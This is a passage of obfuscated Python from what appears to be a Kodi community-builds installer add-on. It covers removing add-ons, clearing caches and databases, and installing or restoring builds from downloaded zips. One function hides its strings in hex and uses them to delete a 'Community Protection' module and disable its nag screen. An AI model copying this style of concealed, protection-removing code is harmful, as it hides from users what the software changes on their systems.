   I1i1ii1IiIii . append ( [ iiIIii , iI1I1iII1i ] )
  xbmc . log ( 'FINAL: %s' % I1i1ii1IiIii )
  if len ( I1i1ii1IiIii ) > 0 :
   oO0Oo0O0 ( I1i1ii1IiIii )
   if 45 - 45: o0oo
   if 87 - 87: o000O0o - OOO0O0O0ooooo - o0o * OoOo0o % OoOo0o
def oO0Oo0O0 ( url ) :
 Oo0o00o0oOoo0 = 0
 for O0oO0 in url :
  I1II = O0oO0 [ 1 ] . replace ( i1iiIII111ii , oo0o0O00 )
  if 'addon_data' in O0oO0 [ 1 ] :
   I1I = 'Addon_Data'
  else :
   I1I = 'Addon'
  if i11 . yesno ( "Remove %s" % I1I , "Do you want to Remove:" , '[COLOR=dodgerblue]%s[/COLOR]' % O0oO0 [ 0 ] ) :
   if not 'addon_data' in O0oO0 [ 1 ] :
    Oo0o00o0oOoo0 = 1
   for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( O0oO0 [ 1 ] ) :
    if 93 - 93: i11Iii / II11iIiIIIiI * OOO0O0O0ooooo
    for Oo0oO00 in oO0Ooo0OooOOo :
     os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
     if 17 - 17: o0oo / i11Iii % o000O0o
    for OOOOI1iI1i11 in OoIIi1iI :
     shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
   os . rmdir ( O0oO0 [ 1 ] )
   if not 'addon_data' in O0oO0 [ 1 ] :
    if i11 . yesno ( 'Remove Addon_Data?' , 'Would you also like to remove the addon_data associated with this add-on? This contains your add-on settings and can contain personal information such as username/password.' ) :
     try :
      for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( I1II ) :
       for Oo0oO00 in oO0Ooo0OooOOo :
        os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
       for OOOOI1iI1i11 in OoIIi1iI :
        shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
      os . rmdir ( I1II )
     except :
      pass
 if Oo0o00o0oOoo0 :
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  IIiI1IiI1iIi1 ( 'nodialog' )
  iI11II1i1I1 ( )
  if 30 - 30: ooo0O0O00
  if 44 - 44: Iii . II11iIiIIIiI
  i11 . ok ( 'REMOVAL COMPLETE' , 'The addons database file now needs purging, to do so we need to restart. If prompted please agree to the deletion otherwise your add-ons may still appear in Kodi even if they don\'t physically exist.' )
  IiII1 ( 'wipe' )
  if 84 - 84: OoOo0o - o0o * Iii
  if 52 - 52: ooo0O0O00 . Oo00oo0oO - oOoO0o00OO0 * IIii1I % o0ii1I / i11Iii
def II1IiI11I1 ( ) :
 oooOo ( )
 IIii1Ii = i11 . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , I11i1 )
 if 85 - 85: o000O0o % i11iIiiIii
 if IIii1Ii != I11i1 :
  Ii1I1I11I1I1i = ntpath . basename ( IIii1Ii )
  if i11 . yesno ( 'Delete Backup File' , 'This will completely remove ' + Ii1I1I11I1I1i , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' ) :
   os . remove ( IIii1Ii )
   if 41 - 41: IIIIiiII111 . i11iIiiIii + OOO0O0O0ooooo - II1 * oooOooOOo0OO
   if 33 - 33: i11Iii
def OOOOooO0oOoO ( ) :
 if i11 . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are log files generated when Kodi crashes and are only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' ) :
  Oo0Oo0 ( )
  i11 . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 46 - 46: oOoO0o00OO0 . Ooo00oOo0oOo % oooOooOOo0OO + Ooo00oOo0oOo
  if 55 - 55: II1
def OOo0OOoo00 ( ) :
 shutil . rmtree ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) )
 i11 . ok ( binascii . unhexlify ( '53746172747570206469616c6f672064697361626c6564' ) , binascii . unhexlify ( '54686520436f6d6d756e6974792050726f74656374696f6e206e61672073637265656e20686173206e6f77206265656e2064697361626c65642e20596f752063616e206e6f77206372656174652061206261636b75702074686174206e6f206c6f6e67657220686173207468652070726f74656374696f6e2c204f4e4c5920796f7520746865206275696c6420617574686f722063616e2064697361626c65207468697320736f206d616b65207375726520796f7520646f6e2774207368617265206c6f67696e20696e666f2e' ) )
 if 90 - 90: o000O0o
 if 4 - 4: II11iIiIIIiI % i11Iii - II11iIiIIIiI - o0ii1I
def IIiI1IiI1iIi1 ( ) :
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder' , 'Do you want to clean the packages folder? This will free up space by deleting the old zip install files of your addons. Keeping these files can also sometimes cause problems when reinstalling addons' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 30 - 30: Oo00oo0oO
 if oO000o0Oo00 == 1 :
  i1iI ( )
  i11 . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 34 - 34: oooOooOOo0OO - Ooo00oOo0oOo - o0ii1I + ooo0O0O00 + OoOo0o
  if 70 - 70: II1 + o0oo * iiII11i1I1IIi
def OoOoO0ooooO0 ( ) :
 if i11 . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove your Thumbnails folder. These will automatically be repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' ) :
  Oo00O00o0 ( )
  o0I1IiiiiI1i1I ( oooOOOOO )
  if 20 - 20: i11iIiiIii - Ooo00oOo0oOo - i11Iii % oooOooOOo0OO . i11Iii
  if i11 . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' ) :
   try :
    xbmc . executebuiltin ( "RestartApp" )
   except :
    IiII1 ( )
    if 50 - 50: IIii1I + OoOo0o - o0o - II1
    if 84 - 84: Iii - o0o
def Oo00O00o0 ( ) :
 OoO00O00O0 = os . path . join ( oO0o0o0ooO0oO , Iii1 ( 'Textures' ) )
 if os . path . exists ( OoO00O00O0 ) :
  try :
   ooOo0o0o00 = database . connect ( OoO00O00O0 )
   iIIi1Iii = ooOo0o0o00 . cursor ( )
  except Exception , O000o0O0Oo :
   xbmc . log ( str ( O000o0O0Oo ) )
   return False
 else :
  xbmc . log ( '%s not found.' % OoO00O00O0 )
  return False
  if 41 - 41: OoOo0o % II1
 iIIi1Iii . execute ( """SELECT name FROM sqlite_master WHERE type = 'table';""" )
 for Oo0O0o0o0OO0o in iIIi1Iii . fetchall ( ) :
  if Oo0O0o0o0OO0o [ 0 ] == 'version' :
   xbmc . log ( 'Data from table `%s` skipped.' % Oo0O0o0o0OO0o [ 0 ] )
  else :
   try :
    iIIi1Iii . execute ( """DELETE FROM %s""" % Oo0O0o0o0OO0o [ 0 ] )
    ooOo0o0o00 . commit ( )
    xbmc . log ( 'Data from table `%s` cleared.' % Oo0O0o0o0OO0o [ 0 ] )
   except O000o0O0Oo :
    xbmc . log ( str ( O000o0O0Oo ) )
    if 87 - 87: o0o . i11iIiiIii + o0ii1I - OoOo0o * i11iIiiIii - o000O0o
 xbmc . log ( '%s DB Purging Complete.' % OoO00O00O0 )
 IiiIi1II1iI = OoO00O00O0 . replace ( '\\' , '/' ) . split ( '/' )
 o0O00o00Ooo ( "Purge Database" , "%s Complete" % IiiIi1II1iI [ len ( IiiIi1II1iI ) - 1 ] )
 if 49 - 49: o0ii1I
 if 71 - 71: i11iIiiIii / O00ooooo00 * o000O0o / Iii
def i1IO0OoO0o ( name , url , description ) :
 if 'Backup' in name :
  oooOo ( )
  o0Oo00oOOO0o = open ( url ) . read ( )
  o0ii1I1 = os . path . join ( I11i1 , description . split ( 'Your ' ) [ 1 ] )
  Oo0oO00 = open ( o0ii1I1 , mode = 'w' )
  Oo0oO00 . write ( o0Oo00oOOO0o )
  Oo0oO00 . close ( )
  if 35 - 35: IIii1I
 else :
  if 'guisettings.xml' in description :
   Ii11iiI1 = open ( os . path . join ( I11i1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   IIii1I1IIii = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % I11iii1Ii
   O0OO0O = re . compile ( IIii1I1IIii ) . findall ( Ii11iiI1 )
   if 50 - 50: o0o + o0ii1I % o000O0o
   for type , Oo0Ooo0000O , i1i1IiIi1i11 in O0OO0O :
    i1i1IiIi1i11 = i1i1IiIi1i11 . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , Oo0Ooo0000O , i1i1IiIi1i11 ) )
    if 83 - 83: OOO0O0O0ooooo * o000O0o . O00ooooo00 . oOoO0o00OO0 - II1
  else :
   o0ii1I1 = os . path . join ( url )
   o0Oo00oOOO0o = open ( os . path . join ( I11i1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Oo0oO00 = open ( o0ii1I1 , mode = 'w' )
   Oo0oO00 . write ( o0Oo00oOOO0o )
   Oo0oO00 . close ( )
   if 11 - 11: o0ii1I * iiII11i1I1IIi
 i11 . ok ( "Restore Complete" , "" , 'All Done !' , '' )
 if 59 - 59: Iii + i11Iii * o0oo / o0oo - oooOooOOo0OO * IIii1I
 if 1 - 1: o0o - iiII11i1I1IIi / O00ooooo00
def OoO00oooo0o ( name , url , video , description , skins , guisettingslink , artpack ) :
 iiiiii = 1
 ooII1 = 0
 o0OOO = os . path . join ( Oo0o0000o0o0 , 'CP_Profiles' )
 IiII11I1I1IIi = os . path . join ( o0OOO , 'list.txt' )
 IiIiI1i1 = [ ]
 IIii1Ii = description . replace ( ' ' , '_' ) . replace ( "'" , "" ) . replace ( ":" , "-" )
 if 44 - 44: Iii
 if not os . path . exists ( o0OOO ) :
  os . makedirs ( o0OOO )
  if 7 - 7: IIIIiiII111 / OoOo0o % i11Iii - OoOo0o * o000O0o
 II11111I = os . path . join ( o0OOO , IIii1Ii )
 if not os . path . exists ( II11111I ) :
  os . makedirs ( II11111I )
 else :
  ooII1 = i11 . yesno ( 'Profile Already Exists' , 'This build is already installed on your system, would you like to remove the old one and reinstall?' )
  if ooII1 == 1 :
   try :
    shutil . rmtree ( II11111I )
    os . makedirs ( II11111I )
   except :
    pass
  else :
   iiiiii = 2
   if 59 - 59: oOoO0o00OO0 / II1 / o0o - O00ooooo00
 if iiiiii == 1 :
  OOo00oOo = os . path . join ( iIi1ii1I1 , IIii1Ii + '_gui.zip' )
  if IiII == 'true' :
   xbmc . log ( "### Download path = %s" % OOo00oOo )
   if 58 - 58: oOoO0o00OO0 / o0oo / oooOooOOo0OO + Oo00oo0oO % ooo0O0O00 / Ooo00oOo0oOo
  I11 . create ( "Community Builds" , "Downloading Skin Tweaks" , '' , 'Please Wait' )
  try :
   downloader . download ( guisettingslink , OOo00oOo )
   if IiII == 'true' :
    xbmc . log ( "### successfully downloaded guisettings.xml" )
  except :
   i11 . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
   if IiII == 'true' :
    xbmc . log ( "### FAILED to download %s" % guisettingslink )
    if 95 - 95: Ooo00oOo0oOo / IIIIiiII111 % o0o - II1
    if 45 - 45: o0oo * II1 / OOO0O0O0ooooo . OoOo0o / Iii
  if zipfile . is_zipfile ( OOo00oOo ) :
   i11ii11IiI1 = str ( os . path . getsize ( OOo00oOo ) )
  else :
   i11ii11IiI1 = '0'
   if 53 - 53: Iii . o000O0o * oOoO0o00OO0
  I11 . create ( "Community Builds" , "Downloading " + description , '' , 'Please Wait' )
  OOo00oOo = os . path . join ( iIi1ii1I1 , IIii1Ii + '.zip' )
  if 56 - 56: IIii1I / IIIIiiII111 % IIIIiiII111 . IIIIiiII111 + o0ii1I * II1
  if not os . path . exists ( iIi1ii1I1 ) :
   os . makedirs ( iIi1ii1I1 )
   if 89 - 89: oooOooOOo0OO - OoOo0o
   if 89 - 89: oOoO0o00OO0 - O00ooooo00 + o0o % iiII11i1I1IIi
  oOo0000oo = os . path . join ( oO , 'extracted' )
  downloader . download ( url , OOo00oOo , I11 )
  if not zipfile . is_zipfile ( OOo00oOo ) :
   i11 . ok ( 'NOT A VALID BUILD' , 'The main file for this build is not a valid zip. Please contact the author of the build and let them know so they can either remove this build or update it. Thank you.' )
   return
   if 31 - 31: ooo0O0O00 - oOoO0o00OO0 * OOO0O0O0ooooo . II1 * o0o / Oo00oo0oO
  I11 . create ( "Community Builds" , "Extracting " + description , '' , 'Please Wait' )
  extract . all ( OOo00oOo , oOo0000oo , I11 )
  if os . path . exists ( os . path . join ( oOo0000oo , 'userdata' , '.cbcfg' ) ) :
   try :
    oO0OooOO0 = os . path . join ( oOo0000oo , 'userdata' , 'addon_data' , 'firstrun' )
    if not os . path . exists ( oO0OooOO0 ) :
     os . makedirs ( oO0OooOO0 )
   except :
    pass
  if IiII == 'true' :
   xbmc . log ( "### Downloaded build to: " + OOo00oOo )
   xbmc . log ( "### Extracted build to: " + oOo0000oo )
   if 20 - 20: i11iIiiIii / Iii + oOoO0o00OO0 / OOO0O0O0ooooo
   if 97 - 97: i11iIiiIii
  IIIIIiI11Ii = open ( I11II1i , mode = 'r' )
  oOo0O = IIIIIiI11Ii . read ( )
  IIIIIiI11Ii . close ( )
  if 16 - 16: O00ooooo00
  Iiiiii = re . compile ( 'id="(.+?)"' ) . findall ( oOo0O )
  OOoo000o = re . compile ( 'name="(.+?)"' ) . findall ( oOo0O )
  O000OoOO0oO = re . compile ( 'version="(.+?)"' ) . findall ( oOo0O )
  if 12 - 12: Iii % II11iIiIIIiI + oooOooOOo0OO . OOO0O0O0ooooo % IIii1I
  iII1o00OO0 = Iiiiii [ 0 ] if ( len ( Iiiiii ) > 0 ) else ''
  Ooii = OOoo000o [ 0 ] if ( len ( OOoo000o ) > 0 ) else ''
  oO0o0oo0O0 = O000OoOO0oO [ 0 ] if ( len ( O000OoOO0oO ) > 0 ) else ''
  if 41 - 41: II1
  xbmc . log ( "### Build name details to store in ti_id: %s" % Ooii )
  if 13 - 13: o0o + OoOo0o - OoOo0o % oooOooOOo0OO / o0o
  IIIII11 = os . path . join ( oOo0000oo , 'userdata' , 'addon_data' , 'ti_id' )
  oooo00OoOoO = os . path . join ( IIIII11 , 'id.xml' )
  if not os . path . exists ( IIIII11 ) :
   os . makedirs ( IIIII11 )
   if 99 - 99: Ooo00oOo0oOo
  oo0O0 = open ( oooo00OoOoO , mode = 'w+' )
  oo0O0 . write ( 'id="' + str ( iII1o00OO0 ) + '"\nname="' + Ooii + '"\nversion="' + oO0o0oo0O0 + '"\ngui="' + i11ii11IiI1 + '"' )
  oo0O0 . close ( )
  if 13 - 13: o0o - i11Iii + ooo0O0O00 % o0o . ooo0O0O00 - O00ooooo00
  if 67 - 67: II11iIiIIIiI . i11iIiiIii + i11Iii . IIii1I
  o0 = os . path . join ( IIIII11 , 'startup.xml' )
  oo0O0 = open ( o0 , mode = 'w+' )
  oo0O0 . write ( 'date="01011001"\nversion="' + oO0o0oo0O0 + '"' )
  oo0O0 . close ( )
  if 28 - 28: o000O0o + o000O0o + OoOo0o
  i11i11IIiiIiI = open ( oooo00OoOoO , 'r' )
  II1iiiiI1Ii11 = i11i11IIiiIiI . read ( )
  i11i11IIiiIiI . close ( )
  xbmc . log ( "### ti_id/id.xml contents: %s" % II1iiiiI1Ii11 )
  if 69 - 69: o0o / O00ooooo00 / oooOooOOo0OO . OoOo0o
  if 41 - 41: oooOooOOo0OO * Oo00oo0oO + o000O0o
  i1IIiiIi1i = i11 . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones supplied in this build?' , yeslabel = 'Replace my settings' , nolabel = 'Keep my settings' )
  if i1IIiiIi1i == 0 :
   Iii1i11 ( os . path . join ( oO , 'extracted' , 'userdata' , 'guisettings.xml' ) )
   if 44 - 44: oOoO0o00OO0
   if 77 - 77: i11iIiiIii - OoOo0o . oOoO0o00OO0 % iiII11i1I1IIi . IIIIiiII111
  for O0oO0 in os . listdir ( i1iIIi1 ) :
   IiIiI1i1 . append ( O0oO0 )
   if 9 - 9: o0ii1I
   if 55 - 55: II11iIiIIIiI % IIii1I + o0o . i11Iii
  O0iI1I1ii11IIi1 = open ( os . path . join ( II11111I , 'addonlist' ) , mode = 'w+' )
  for O0oO0 in os . listdir ( i1iiIII111ii ) :
   if not O0oO0 in IiIiI1i1 and O0oO0 != 'plugin.program.totalinstaller' and O0oO0 != 'packages' :
    O0iI1I1ii11IIi1 . write ( O0oO0 + '|' )
  O0iI1I1ii11IIi1 . close ( )
  if IiII == 'true' :
   xbmc . log ( "### Created addonlist to: %s" % os . path . join ( II11111I , 'addonlist' ) )
  i1iii1IiiiI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' , '.cbcfg' ]
  I111iiiii1 = "Creating Profile Data File"
  OO0ooOoOO0OOo = "Archiving..."
  OooOoooo0000 = ""
  I1ii1i11i = "Please Wait"
  o00Ooo0 ( oOo0000oo , os . path . join ( II11111I , 'build.zip' ) , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
  if IiII == 'true' :
   xbmc . log ( "### Created: %s" % os . path . join ( II11111I , 'build.zip' ) )
   if 71 - 71: i11iIiiIii / O00ooooo00 + Iii
   if 23 - 23: i11iIiiIii
  if IIi1IiiiI1Ii == 'false' :
   os . remove ( OOo00oOo )
   if IiII == 'true' :
    xbmc . log ( "### removed: %s" % OOo00oOo )
    if 88 - 88: Ooo00oOo0oOo - ooo0O0O00 / II1
  Iii1i11iiI1 ( IIii1Ii )
  OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( iII1o00OO0 )
  if not 'update' in video :
   try :
    oOOOOoOO0o ( OO0O0ooOOO00 , 5 )
   except :
    pass
    if 71 - 71: oOoO0o00OO0
    if 19 - 19: iiII11i1I1IIi - o0oo + i11iIiiIii / IIii1I
  i1iI11IiII ( II11111I )
  if 83 - 83: oOoO0o00OO0
  if 53 - 53: Iii % i11Iii . o0oo + o000O0o / oOoO0o00OO0
  if 76 - 76: oOoO0o00OO0 . IIii1I - i11iIiiIii / oOoO0o00OO0 - o0ii1I
  if 95 - 95: o0o
def Oooo0o0oO ( url ) :
 O000O = 0
 OOoO00OOo = 0
 if 42 - 42: O00ooooo00 . i11iIiiIii / Iii
 oooOo ( )
 if 27 - 27: o000O0o / II1
 if url == 'local' :
  IIii1Ii = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , I11i1 )
  if IIii1Ii == '' :
   O000O = 1
   if 74 - 74: oOoO0o00OO0 % OoOo0o - o0oo * o0o . II1 * o0oo
 if O000O == 1 :
  print "### No file selected, quitting restore process ###"
  return
  if 99 - 99: Iii . ooo0O0O00 - II1 - OOO0O0O0ooooo
 if url != 'local' :
  I11 . create ( "Community Builds" , "Downloading build." , '' , 'Please Wait' )
  IIii1Ii = os . path . join ( iIi1ii1I1 , Ii1Ii ( ) + '.zip' )
  if 6 - 6: II11iIiIIIiI
  if not os . path . exists ( iIi1ii1I1 ) :
   os . makedirs ( iIi1ii1I1 )
   if 3 - 3: OOO0O0O0ooooo - OoOo0o * IIIIiiII111 * II11iIiIIIiI / IIIIiiII111
  downloader . download ( url , IIii1Ii , I11 )
  if 58 - 58: IIIIiiII111 * IIii1I + i11Iii . i11Iii
 if os . path . exists ( i1I1iI ) :
  if os . path . exists ( iiI1IiI ) :
   os . remove ( i1I1iI )
  else :
   os . rename ( i1I1iI , iiI1IiI )
   if 74 - 74: i11Iii - o0ii1I * Oo00oo0oO % i11Iii
 if os . path . exists ( II ) :
  os . remove ( II )
  if 93 - 93: IIii1I / Iii % iiII11i1I1IIi * OoOo0o - o0oo - o0ii1I
  if 44 - 44: II1
 if not os . path . exists ( I11II1i ) :
  IIIIIiI11Ii = open ( I11II1i , mode = 'w+' )
  if 82 - 82: Iii . Iii
 if os . path . exists ( oo0OooOOo0 ) :
  os . removedirs ( oo0OooOOo0 )
  if 10 - 10: iiII11i1I1IIi * oOoO0o00OO0 . oooOooOOo0OO . II1 . II11iIiIIIiI * oOoO0o00OO0
  if 80 - 80: OoOo0o + o0o . OoOo0o + II11iIiIIIiI
 try :
  os . rename ( iiI1IiI , i1I1iI )
  if 85 - 85: i11iIiiIii . o0o + IIIIiiII111 / IIIIiiII111
 except :
  i11 . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
  if 43 - 43: Oo00oo0oO . II1 - Ooo00oOo0oOo
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( OOo0 , 'We highly recommend backing up your existing build before installing any builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if oO000o0Oo00 == 0 :
  OoOo0O0O = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' ) )
  if 65 - 65: Oo00oo0oO - OoOo0o
  if not os . path . exists ( OoOo0O0O ) :
   os . makedirs ( OoOo0O0O )
   if 71 - 71: iiII11i1I1IIi - O00ooooo00
  O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
  if ( not O0O0 ) :
   return False , 0
   if 27 - 27: Iii . OOO0O0O0ooooo / oOoO0o00OO0 . IIii1I
  oOIIII = urllib . quote_plus ( O0O0 )
  ooOOo = xbmc . translatePath ( os . path . join ( OoOo0O0O , oOIIII + '.zip' ) )
  i1iii1IiiiI1i1 = [ OO0o ]
  IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
  I111iiiii1 = "Creating full backup of existing build"
  OO0ooOoOO0OOo = "Archiving..."
  OooOoooo0000 = ""
  I1ii1i11i = "Please Wait"
  if 15 - 15: IIIIiiII111 + o0oo % IIii1I - oOoO0o00OO0 - O00ooooo00 % o0ii1I
  o00Ooo0 ( Oo0o0000o0o0 , ooOOo , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
 O0ooO00OO = xbmcgui . Dialog ( ) . yesno ( OOo0 , 'Would you like to keep your existing database files or overwrite? Overwriting will wipe any existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if O0ooO00OO == 1 :
  if os . path . exists ( o0OO00oO ) :
   shutil . rmtree ( o0OO00oO )
   if 43 - 43: Ooo00oOo0oOo . ooo0O0O00 / IIIIiiII111 - o0o
  try :
   shutil . copytree ( oO0o0o0ooO0oO , o0OO00oO , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 36 - 36: ooo0O0O00 - Oo00oo0oO * IIii1I % o0o / Oo00oo0oO
  except :
   OOoO00OOo = xbmcgui . Dialog ( ) . yesno ( OOo0 , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if OOoO00OOo == 1 : pass
   if OOoO00OOo == 0 : O000O = 1 ; return
   if 35 - 35: Ooo00oOo0oOo . OOO0O0O0ooooo - ooo0O0O00 / II1 . Ooo00oOo0oOo * o000O0o
  ooOOo = xbmc . translatePath ( os . path . join ( I11i1 , 'Database.zip' ) )
  I11I1i1iI ( o0OO00oO , ooOOo )
  if 15 - 15: OOO0O0O0ooooo
 if O000O == 1 :
  print "### User decided to exit restore function ###"
  return
  if 32 - 32: II1
 else :
  time . sleep ( 1 )
  o0o0O0O00oOOo = open ( ii11iIi1I , mode = 'r' )
  Oo0ooO0O0o00o = o0o0O0O00oOOo . read ( )
  o0o0O0O00oOOo . close ( )
  if 29 - 29: oOoO0o00OO0
  if 41 - 41: IIIIiiII111
  print "### Checking zip file structure ###"
  I1iiI1II11 = zipfile . ZipFile ( IIii1Ii )
  if 'xbmc.log' in I1iiI1II11 . namelist ( ) or 'kodi.log' in I1iiI1II11 . namelist ( ) or '.git' in I1iiI1II11 . namelist ( ) or '.svn' in I1iiI1II11 . namelist ( ) :
   print "### Whoever created this build has used completely the wrong backup method, lets try and fix it! ###"
   i11 . ok ( 'Fixing Bad Zip' , 'Whoever created this build has used the wrong backup method, please wait while we fix it - this could take some time! Click OK to proceed' )
   ooooO000 = zipfile . ZipFile ( IIii1Ii , 'r' )
   O0OOO0o0O = os . path . join ( iIi1ii1I1 , 'fixed.zip' )
   oOo0oOooOoO00 = zipfile . ZipFile ( O0OOO0o0O , 'w' )
   if 6 - 6: iiII11i1I1IIi + iiII11i1I1IIi % iiII11i1I1IIi % OOO0O0O0ooooo . II11iIiIIIiI
   I11 . create ( "Fixing Build" , "Checking " , '' , 'Please Wait' )
   if 7 - 7: IIIIiiII111 - O00ooooo00 % o0oo / IIii1I % o0ii1I
   for O0oO0 in ooooO000 . infolist ( ) :
    buffer = ooooO000 . read ( O0oO0 . filename )
    iIIiiIIiiII = str ( O0oO0 . filename )
    if 87 - 87: oOoO0o00OO0 % Iii + IIIIiiII111 . i11iIiiIii / IIIIiiII111
    if ( O0oO0 . filename [ - 4 : ] != '.log' ) and not '.git' in iIIiiIIiiII and not '.svn' in iIIiiIIiiII :
     oOo0oOooOoO00 . writestr ( O0oO0 , buffer )
     I11 . update ( 0 , "Fixing..." , '[COLOR yellow]%s[/COLOR]' % O0oO0 . filename , 'Please Wait' )
     if 32 - 32: IIIIiiII111 + Oo00oo0oO + oOoO0o00OO0
   I11 . close ( )
   oOo0oOooOoO00 . close ( )
   ooooO000 . close ( )
   IIii1Ii = O0OOO0o0O
   if 79 - 79: O00ooooo00 / IIIIiiII111
  I11 . create ( "Restoring Backup Build" , "Checking " , '' , 'Please Wait' )
  I11 . update ( 0 , "" , "Extracting Zip Please Wait" )
  if 81 - 81: IIii1I
  try :
   extract . all ( IIii1Ii , Oo0o0000o0o0 , I11 )
  except :
   i11 . ok ( 'ERROR IN BUILD ZIP' , 'Please contact the build author, there are errors in this zip file that has caused the install process to fail. Most likely cause is it contains files with special characters in the name.' )
   return
   if 86 - 86: Oo00oo0oO % Oo00oo0oO % II1
  time . sleep ( 1 )
  if 42 - 42: iiII11i1I1IIi . oooOooOOo0OO + OOO0O0O0ooooo / II11iIiIIIiI % II1
  if O0ooO00OO == 1 :
   extract . all ( ooOOo , oO0o0o0ooO0oO , I11 )
   if 19 - 19: i11Iii / IIIIiiII111
   if OOoO00OOo != 1 :
    shutil . rmtree ( o0OO00oO )
    if 43 - 43: Iii % IIIIiiII111 + iiII11i1I1IIi - II1 . OOO0O0O0ooooo % iiII11i1I1IIi
  OOOOo00oOOO00 = open ( ii11iIi1I , mode = 'w+' )
  OOOOo00oOOO00 . write ( Oo0ooO0O0o00o )
  OOOOo00oOOO00 . close ( )
  try :
   os . rename ( iiI1IiI , II )
   if 13 - 13: oOoO0o00OO0 / o0oo * i11iIiiIii % o0oo % o0oo * Ooo00oOo0oOo
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 17 - 17: o0o . OOO0O0O0ooooo * O00ooooo00 - Iii % O00ooooo00
  time . sleep ( 1 )
  IIIIIiI11Ii = open ( i1I1iI , mode = 'r' )
  oOo0O = IIIIIiI11Ii . read ( )
  IIIIIiI11Ii . close ( )
  o0oOOoOo00o = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOo0O )
  IiO0o = o0oOOoOo00o [ 0 ] if ( len ( o0oOOoOo00o ) > 0 ) else ''
  i1I11IiI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOo0O )
  oOo0Oooo = i1I11IiI [ 0 ] if ( len ( i1I11IiI ) > 0 ) else ''
  iiiiI = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOo0O )
  I1iiIIiI11I = iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else ''
  if 35 - 35: IIIIiiII111 + oOoO0o00OO0 . oooOooOOo0OO * iiII11i1I1IIi
  try :
   oo0O = open ( II , mode = 'r' )
   Iii1iI1iiIii = oo0O . read ( )
   oo0O . close ( )
   I1Ii1iI1IiI1I = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( Iii1iI1iiIii )
   oOoO = I1Ii1iI1IiI1I [ 0 ] if ( len ( I1Ii1iI1IiI1I ) > 0 ) else ''
   o0OOOoO = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( Iii1iI1iiIii )
   o0O0o0O = o0OOOoO [ 0 ] if ( len ( o0OOOoO ) > 0 ) else ''
   ooo0OO0OOoooOo00 = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( Iii1iI1iiIii )
   iiII1i1i1I1 = ooo0OO0OOoooOo00 [ 0 ] if ( len ( ooo0OO0OOoooOo00 ) > 0 ) else ''
